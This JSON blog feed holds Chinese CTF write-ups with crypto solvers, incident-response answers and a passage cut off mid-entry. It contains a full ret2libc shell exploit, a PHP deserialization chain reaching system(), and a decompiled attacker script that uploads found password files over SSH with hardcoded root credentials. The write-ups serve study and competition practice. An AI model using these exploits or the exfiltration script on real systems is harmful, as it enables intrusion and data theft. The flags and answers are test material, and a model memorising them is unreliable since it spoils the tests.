{
    "version": "https://jsonfeed.org/version/1",
    "title": "ililiiY",
    "description": "坚持与努力",
    "home_page_url": "https://lookhui.github.io",
    "items": [
        {
            "id": "https://lookhui.github.io/%E5%B7%B4%E6%B8%9D%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/",
            "url": "https://lookhui.github.io/%E5%B7%B4%E6%B8%9D%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/",
            "title": "巴渝杯初赛wp",
            "date_published": "2024-04-24T03:53:34.000Z",
            "content_html": "<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h2>\n<p>Check</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/mhJiORPWHvVF1t7.png\" alt=\"image-20240424155721348\" /></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> crypto</h2>\n<h4 id=\"get-the-ciphertext\"><a class=\"anchor\" href=\"#get-the-ciphertext\">#</a> Get the ciphertext</h4>\n<p>Ook 和 Brainfuck 解码</p>\n<p fd62371a16e34b4236af4c815c70d2c2=\"\">flag</p>\n<h4 id=\"银行卡\"><a class=\"anchor\" href=\"#银行卡\">#</a> 银行卡</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import gmpy2</span><br><span class=\"line\">from Crypto.Util.number import long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\">nspan><br><span class=\"line\">e1=806324329</span><br><span class=\"line\">e2=981665371</span><br><span class=\"line\">cspan><br><span class=\"line\">cspan><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def exp_def(e1,e2,c1,c2,n):</span><br><span class=\"line\"></span><br><span class=\"line\">    s,s1,s2 = gmpy2.gcdext(e1, e2)</span><br><span class=\"line\"></span><br><span class=\"line\">    m = (pow(c1,s1,n) * pow(c2 ,s2 ,n)) % n</span><br><span class=\"line\"></span><br><span class=\"line\">    return int(m)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">m=exp_def(e1,e2,c1,c2,n)</span><br><span class=\"line\"></span><br><span class=\"line\">print(long_to_bytes(m))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> pwn</h2>\n<p>很平常的 ret2libc 平常环境打不进去</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context.log_level = &quot;debug&quot;</span><br><span class=\"line\">program = &quot;ret2libc&quot;</span><br><span class=\"line\">p = remote(&quot;node.nsctf.cn&quot;,56526)#</span><br><span class=\"line\"># p=process(program)</span><br><span class=\"line\">elf = ELF(program)</span><br><span class=\"line\">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class=\"line\">puts_got = elf.got[&quot;puts&quot;]</span><br><span class=\"line\">libc=ELF(&quot;libc6_2.23-0ubuntu11.3_amd64.so&quot;, checksec = False)</span><br><span class=\"line\">pop_rdi = 0x0000000000400763</span><br><span class=\"line\">pop_ret = 0x0000000000400509</span><br><span class=\"line\">__start = 0x00000000004006A9</span><br><span class=\"line\">payload = b&#x27;a&#x27;*(0x40+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) #//跳转到rdi寄存器上面然后在通过puts函数来打印puts的got在通过ret到起始位置让下面的payload生效</span><br><span class=\"line\">p.sendlineafter(b&quot;want\\n&quot;,payload)</span><br><span class=\"line\">puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\">libc_base = puts_addr - libc.sym[b&#x27;puts&#x27;]</span><br><span class=\"line\">system = libc_base + libc.symbols[b&#x27;system&#x27;]</span><br><span class=\"line\">bin_sh_str= libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\">log.info(&#x27;libc addr is %x&#x27;%libc_base)</span><br><span class=\"line\">log.info(&#x27;bin_sh_str is %x&#x27;%bin_sh_str)</span><br><span class=\"line\">payload2 = b&#x27;a&#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)</span><br><span class=\"line\">p.sendlineafter(&quot;want&quot;,payload2)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"re\"><a class=\"anchor\" href=\"#re\">#</a> re</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># p= &#123; 102, 109, 99, 100, 127, 100, 117, 99, 110, 86, 110, 106, 96, 126, 101, 101, 79, 112, 126, 119, 103, 126, 124, 113, 116, 100 &#125;</span><br><span class=\"line\">p=[102, 109, 99, 100, 127, </span><br><span class=\"line\">                 100, 117, 99, 110, 86, </span><br><span class=\"line\">                 110, 106, 96, 126, 101, </span><br><span class=\"line\">                 101, 79, 112, 126, 119, </span><br><span class=\"line\">                 103, 126, 124, 113, 116, </span><br><span class=\"line\">                 100 ]</span><br><span class=\"line\">ebx=0</span><br><span class=\"line\">for i in range(len(p)):</span><br><span class=\"line\">\tp[i]^=ebx</span><br><span class=\"line\">\tebx+=1</span><br><span class=\"line\">p=[chr(i) for i in p]</span><br><span class=\"line\">print(p)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> misc</h2>\n<h4 id=\"流量分析\"><a class=\"anchor\" href=\"#流量分析\">#</a> 流量分析</h4>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/p2cdJTZgVGDq6zm.jpg\" alt=\"img\" /></p>\n<p>第 289 条</p>\n<p>直接 base64 解密</p>\n<h4 id=\"20201118_zip\"><a class=\"anchor\" href=\"#20201118_zip\">#</a> 20201118_zip</h4>\n<p>伪加密打开后一个提示一个 zip</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/gQnmPBaei4wHG6d.jpg\" alt=\"img\" /></p>\n<p>告诉我们 11 位密码开头 186，猜测是手机号码纯数字</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/EVsLW7jZNgu3rIy.jpg\" alt=\"img\" /> 最后一个 crc 一样明文爆破</p>\n",
            "tags": [
                "比赛"
            ]
        },
        {
            "id": "https://lookhui.github.io/%E5%B8%95%E9%B2%81%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
            "url": "https://lookhui.github.io/%E5%B8%95%E9%B2%81%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
            "title": "帕鲁杯",
            "date_published": "2024-04-22T07:56:46.000Z",
            "content_html": "<h1 id=\"帕鲁应急响应ctf\"><a class=\"anchor\" href=\"#帕鲁应急响应ctf\">#</a> 帕鲁应急响应 ctf</h1>\n<h2 id=\"应急响应\"><a class=\"anchor\" href=\"#应急响应\">#</a> 应急响应</h2>\n<p>解压密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Network@@ZGSF&amp;One-FoxSelfTeam</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-1\"><a class=\"anchor\" href=\"#应急响应-1\">#</a> 应急响应 - 1</h3>\n<p>首先打开除了 pc 机外的靶机设置 net 模式后按照要求去访问 jump 靶机</p>\n<p>打开标签处得到第一个 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[BrYeaVj54009rDIZzu4O]</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/JAUZG4MhmaDX6Hn.png\" alt=\"image-20240419094415298\" /></p>\n<h3 id=\"应急响应-2\"><a class=\"anchor\" href=\"#应急响应-2\">#</a> 应急响应 - 2</h3>\n<p>jump 上查看</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/aRcW4PFBOxwCsVG.jpg\" alt=\"img\" /></p>\n<h3 id=\"应急响应-3\"><a class=\"anchor\" href=\"#应急响应-3\">#</a> 应急响应 - 3</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.1.4</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-4\"><a class=\"anchor\" href=\"#应急响应-4\">#</a> 应急响应 - 4</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CVE-2024-29201</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-5\"><a class=\"anchor\" href=\"#应急响应-5\">#</a> 应急响应 - 5</h3>\n<p>就在 root 文件夹下</p>\n<h3 id=\"应急响应-6\"><a class=\"anchor\" href=\"#应急响应-6\">#</a> 应急响应 - 6</h3>\n<p>home 使用 python 写的还原即可得到账号密码</p>\n<h3 id=\"应急响应-7\"><a class=\"anchor\" href=\"#应急响应-7\">#</a> 应急响应 - 7</h3>\n<p>8080</p>\n<h3 id=\"应急响应-8\"><a class=\"anchor\" href=\"#应急响应-8\">#</a> 应急响应 - 8</h3>\n<p>/api/system</p>\n<h3 id=\"应急响应-9\"><a class=\"anchor\" href=\"#应急响应-9\">#</a> 应急响应 - 9</h3>\n<p>在 /flask/log.txt/log.txt</p>\n<p>下面有一个反弹 dns</p>\n<h3 id=\"应急响应-10\"><a class=\"anchor\" href=\"#应急响应-10\">#</a> 应急响应 - 10</h3>\n<p>是时间戳转换一下</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/kMzpHsY8VwQgm6v.png\" alt=\"image-20240421210914004\" /></p>\n<h3 id=\"应急响应-11\"><a class=\"anchor\" href=\"#应急响应-11\">#</a> 应急响应 - 11</h3>\n<p>python</p>\n<h3 id=\"应急响应-12\"><a class=\"anchor\" href=\"#应急响应-12\">#</a> 应急响应 - 12</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.20.123</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-13\"><a class=\"anchor\" href=\"#应急响应-13\">#</a> 应急响应 - 13</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">palu.com</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-14\"><a class=\"anchor\" href=\"#应急响应-14\">#</a> 应急响应 - 14</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(123123)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-15没有搞出\"><a class=\"anchor\" href=\"#应急响应-15没有搞出\">#</a> 应急响应 - 15 (没有搞出)</h3>\n<p>我在 waf 看了半天也没有看到到底是多少条</p>\n<h3 id=\"应急响应-16\"><a class=\"anchor\" href=\"#应急响应-16\">#</a> 应急响应 - 16</h3>\n<p>在 nginx 目录下</p>\n<p>有一个 hack 文本</p>\n<h3 id=\"应急响应-17\"><a class=\"anchor\" href=\"#应急响应-17\">#</a> 应急响应 - 17</h3>\n<p>在 bin 下的 helloworld 就是后门文件</p>\n<h3 id=\"应急响应-18\"><a class=\"anchor\" href=\"#应急响应-18\">#</a> 应急响应 - 18</h3>\n<p>看那个都很像但是只有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">begingame才算</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-19\"><a class=\"anchor\" href=\"#应急响应-19\">#</a> 应急响应 - 19</h3>\n<p>看时间能看出注册了 10 个使用账号密码登录到网站后台</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin</span><br><span class=\"line\">Network@2020</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-20\"><a class=\"anchor\" href=\"#应急响应-20\">#</a> 应急响应 - 20</h3>\n<p>waf 里面</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2024-04-16 21:03:46</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-21\"><a class=\"anchor\" href=\"#应急响应-21\">#</a> 应急响应 - 21</h3>\n<p>下载的文件是 upload.zip</p>\n<h3 id=\"应急响应-22\"><a class=\"anchor\" href=\"#应急响应-22\">#</a> 应急响应 - 22</h3>\n<p>使用 palu.com 进入 webserver 服务器</p>\n<p>然后使用 sudo su 得到 root 权限</p>\n<p>查看 apache 日志即可得到</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/2LaQSczITGbljqn.png\" alt=\"image-20240421212104133\" /></p>\n<p>在扫描时把 upload.zip 给扫描下来了</p>\n<h3 id=\"应急响应-23\"><a class=\"anchor\" href=\"#应急响应-23\">#</a> 应急响应 - 23</h3>\n<p>在 /var/www/html/api 目录下</p>\n<h3 id=\"应急响应-24\"><a class=\"anchor\" href=\"#应急响应-24\">#</a> 应急响应 - 24</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nidewen</span><br></pre></td></tr></table></figure></p>\n<p>就是文件名</p>\n<h3 id=\"应急响应-25\"><a class=\"anchor\" href=\"#应急响应-25\">#</a> 应急响应 - 25</h3>\n<p>登录 PC1 查看本地用户，发现 hacker 可疑账号</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/m6rqkHKVgfvTo4M.png\" alt=\"image-20240421212736577\" /></p>\n<h3 id=\"应急响应-26\"><a class=\"anchor\" href=\"#应急响应-26\">#</a> 应急响应 - 26</h3>\n<p>查看 hacker 的详细信息可以知道到期时间：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/BvakIHPQjo718uK.png\" alt=\"image-20240421212757620\" /></p>\n<h3 id=\"应急响应-27\"><a class=\"anchor\" href=\"#应急响应-27\">#</a> [应急响应 - 27]</h3>\n<p>提取 PC1 上的 raw.raw 文件到 volatility 分析：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/Iuyb261Z3Jo9FXh.jpg\" alt=\"Snipaste_2024-04-19_20-16-19\" /></p>\n<p>从 Suggested 可知镜像文件可能为 Win7SP1x64, 再查看进程</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/c5yholQms4JpitA.jpg\" alt=\"Snipaste_2024-04-19_20-19-14\" /></p>\n<h3 id=\"应急响应-28\"><a class=\"anchor\" href=\"#应急响应-28\">#</a> 应急响应 - 28</h3>\n<p>这个一开始我是真的随便一下就出了，直接 notepad++ 打开查找 username</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/mzuKPk4ofxSbqvn.png\" alt=\"image-20240419194656616\" /></p>\n<h3 id=\"应急响应-29\"><a class=\"anchor\" href=\"#应急响应-29\">#</a> 应急响应 - 29</h3>\n<p>使用 volatility 获取剪切板内容即可得到</p>\n<p>吐槽：我搞半天没有想到这个题竟然是之前信息安全管理与评估的原题</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/21/TFmUIBW6RlSADX2.jpg\" alt=\"img\" /></p>\n<h3 id=\"应急响应-30没有搞出\"><a class=\"anchor\" href=\"#应急响应-30没有搞出\">#</a> 应急响应 - 30 (没有搞出)</h3>\n<p>看了半天没有搞出来什么命令都试了把 contart 都导出来了但是还是没有得到地址</p>\n<h3 id=\"应急响应-31\"><a class=\"anchor\" href=\"#应急响应-31\">#</a> 应急响应 - 31</h3>\n<p>在登陆 PC2 的时候会弹出 artifact.exe 程序很可疑查看它的 SHA256、MD5 值，发现 MD5 值是我们要的值：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/nxugAwGvPI615fa.png\" alt=\"image-20240421213234540\" /></p>\n<h3 id=\"应急响应-32\"><a class=\"anchor\" href=\"#应急响应-32\">#</a> 应急响应 - 32</h3>\n<h3 id=\"应急响应-33\"><a class=\"anchor\" href=\"#应急响应-33\">#</a> 应急响应 - 33</h3>\n<p>扫描工具 fscan</p>\n<p>可以在 jump 里面看 webserver 执行的命令直接看到</p>\n<h3 id=\"应急响应-34\"><a class=\"anchor\" href=\"#应急响应-34\">#</a> 应急响应 - 34</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">123</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-35\"><a class=\"anchor\" href=\"#应急响应-35\">#</a> 应急响应 - 35</h3>\n<p>去数据库硬翻的</p>\n<h3 id=\"image-20240419181351855\"><a class=\"anchor\" href=\"#image-20240419181351855\">#</a> <img data-src=\"https://s2.loli.net/2024/04/26/8vAk697aFbB1iUV.png\" alt=\"image-20240419181351855\" /></h3>\n<h3 id=\"应急响应-36\"><a class=\"anchor\" href=\"#应急响应-36\">#</a> 应急响应 - 36</h3>\n<p>在监控服务器上翻到的</p>\n<h3 id=\"应急响应-37没有做出\"><a class=\"anchor\" href=\"#应急响应-37没有做出\">#</a> 应急响应 - 37 (没有做出)</h3>\n<p>没有翻到</p>\n<h3 id=\"应急响应-38\"><a class=\"anchor\" href=\"#应急响应-38\">#</a> 应急响应 - 38</h3>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/Wx1bYhj9SUv6rN3.png\" alt=\"image-20240421211039583\" /></p>\n<h3 id=\"应急响应-39\"><a class=\"anchor\" href=\"#应急响应-39\">#</a> 应急响应 - 39</h3>\n<p>在 pc2 里面就能看到</p>\n<p>可以在 pc2 里面搜索或者在堡垒机上查看 pc2 看视频也能知道</p>\n<h3 id=\"应急响应-40没有做出\"><a class=\"anchor\" href=\"#应急响应-40没有做出\">#</a> 应急响应 - 40 (没有做出)</h3>\n<h3 id=\"应急响应-41\"><a class=\"anchor\" href=\"#应急响应-41\">#</a> 应急响应 - 41</h3>\n<p>陈琚鹭</p>\n<h3 id=\"应急响应-42\"><a class=\"anchor\" href=\"#应急响应-42\">#</a> 应急响应 - 42</h3>\n<p>在注册表中写了一串 flag</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/pyMU6CnR4w8JdL1.png\" alt=\"image-20240421215006138\" /></p>\n<h3 id=\"应急响应-43\"><a class=\"anchor\" href=\"#应急响应-43\">#</a> 应急响应 - 43</h3>\n<p>md5（49）</p>\n<h3 id=\"应急响应-44\"><a class=\"anchor\" href=\"#应急响应-44\">#</a> 应急响应 - 44</h3>\n<p>堡垒机视频里面能够看到</p>\n<p>创建的是</p>\n<p>Network@2020</p>\n<h3 id=\"应急响应-45\"><a class=\"anchor\" href=\"#应急响应-45\">#</a> 应急响应 - 45</h3>\n<p>encode.txt</p>\n<h3 id=\"应急响应-46\"><a class=\"anchor\" href=\"#应急响应-46\">#</a> 应急响应 - 46</h3>\n<p>和密码那个题一样</p>\n<p>Chrome 浏览器搜索关键词发现有一款免杀程序用了这个编码：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/2kSTIqNXBy9tgPD.png\" alt=\"image-20240421215239368\" /></p>\n<h3 id=\"应急响应-47\"><a class=\"anchor\" href=\"#应急响应-47\">#</a> 应急响应 - 47</h3>\n<h3 id=\"应急响应-48\"><a class=\"anchor\" href=\"#应急响应-48\">#</a> 应急响应 - 48</h3>\n<p>palucomeyi1.exe</p>\n<h3 id=\"应急响应-49\"><a class=\"anchor\" href=\"#应急响应-49\">#</a> 应急响应 - 49</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import paramiko</span><br><span class=\"line\">from getpass import getpass</span><br><span class=\"line\"></span><br><span class=\"line\">def search_in_files(directory, search_text):</span><br><span class=\"line\">Unsupported opcode: BEGIN_FINALLY</span><br><span class=\"line\">    pass</span><br><span class=\"line\"># WARNING: Decompyle incomplete</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def ssh(local_file_path, remote_file_path):</span><br><span class=\"line\">    hostname = &#x27;192.168.20.123&#x27;</span><br><span class=\"line\">    port = 22</span><br><span class=\"line\">    username = &#x27;root&#x27;</span><br><span class=\"line\">    password = &#x27;Network@2020&#x27;</span><br><span class=\"line\">    client = paramiko.SSHClient()</span><br><span class=\"line\">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class=\"line\">    client.connect(hostname, port, username, password)</span><br><span class=\"line\">    sftp = client.open_sftp()</span><br><span class=\"line\">    sftp.put(local_file_path, remote_file_path)</span><br><span class=\"line\">    sftp.close()</span><br><span class=\"line\">    client.close()</span><br><span class=\"line\">    print(f&#x27;&#x27;&#x27;File &#123;local_file_path&#125; uploaded to &#123;remote_file_path&#125; on &#123;hostname&#125;&#x27;&#x27;&#x27;)</span><br><span class=\"line\">    flag = &#x27;flag&#123;234567uyhgn_aiduyai&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">search_directory = &#x27;/&#x27;</span><br><span class=\"line\">search_for_text = &#x27;passwod&#x27;</span><br><span class=\"line\">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class=\"line\">ssh(a, b)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-50\"><a class=\"anchor\" href=\"#应急响应-50\">#</a> 应急响应 - 50</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;234567uyhgn_aiduyai&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-51\"><a class=\"anchor\" href=\"#应急响应-51\">#</a> 应急响应 - 51</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">passwod</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-52爆破半天跑不出来\"><a class=\"anchor\" href=\"#应急响应-52爆破半天跑不出来\">#</a> 应急响应 - 52 (爆破半天跑不出来)</h3>\n<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"r23\"><a class=\"anchor\" href=\"#r23\">#</a> r23</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class a&#123;</span><br><span class=\"line\">    public function __get($a)&#123;</span><br><span class=\"line\">        $this-&gt;b-&gt;love();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class b&#123;</span><br><span class=\"line\">    public function __destruct()&#123;</span><br><span class=\"line\">        $tmp = $this-&gt;c-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        $this-&gt;c = &quot;no!&quot;;</span><br><span class=\"line\">        $this-&gt;b = $this-&gt;a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class xk&#123;</span><br><span class=\"line\">    public function love()&#123;</span><br><span class=\"line\">       system($_GET[&#x27;a&#x27;]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a[&#x27;1&#x27;] = new b();</span><br><span class=\"line\">$a[&#x27;2&#x27;] = new b();</span><br><span class=\"line\">$a[&#x27;2&#x27;]-&gt;b = &amp;$a[&#x27;2&#x27;]-&gt;c;</span><br><span class=\"line\">$a[&#x27;2&#x27;]-&gt;a = new a();</span><br><span class=\"line\">$a[&#x27;2&#x27;]-&gt;a-&gt;b = new xk();</span><br><span class=\"line\">echo serialize($a);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"web-签到\"><a class=\"anchor\" href=\"#web-签到\">#</a> Web - 签到</h3>\n<p>下载源码，</p>\n<p>很简单直接访问自己的 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/flag</span><br></pre></td></tr></table></figure></p>\n<p>即可</p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> crypto</h2>\n<h3 id=\"玛卡巴卡能有什么坏心思呢\"><a class=\"anchor\" href=\"#玛卡巴卡能有什么坏心思呢\">#</a> 玛卡巴卡能有什么坏心思呢</h3>\n<p><a href=\"https://www.ddosi.org/drt-aav/\"><em>https://www.ddosi.org/drt-aav/</em></a> 去这个网站找字典</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/s5iom17b2BEcJOa.png\" alt=\"标题: fig:\" /></p>\n<p>encoding_rules = {<br />\n'a': ' 玛卡巴卡轰 ',<br />\n'b': ' 阿巴雅卡轰 ',<br />\n'c': ' 伊卡阿卡噢轰 ',<br />\n'd': ' 哈姆达姆阿卡嗙轰 ',<br />\n'e': ' 咿呀呦轰 ',<br />\n'f': ' 玛卡雅卡轰 ',<br />\n'g': ' 伊卡阿卡轰 ',<br />\n'h': ' 咿呀巴卡轰 ',<br />\n'i': ' 达姆阿卡嗙轰 ',<br />\n'j': ' 玛卡巴卡玛卡巴卡轰 ',<br />\n'k': ' 玛卡巴卡玛卡巴卡玛卡巴卡轰 ',<br />\n'l': ' 玛卡巴卡玛卡巴卡玛卡巴卡玛卡巴卡轰 ',<br />\n'm': ' 阿巴雅卡阿巴雅卡轰 ',<br />\n'n': ' 阿巴雅卡阿巴雅卡阿巴雅卡轰 ',<br />\n'o': ' 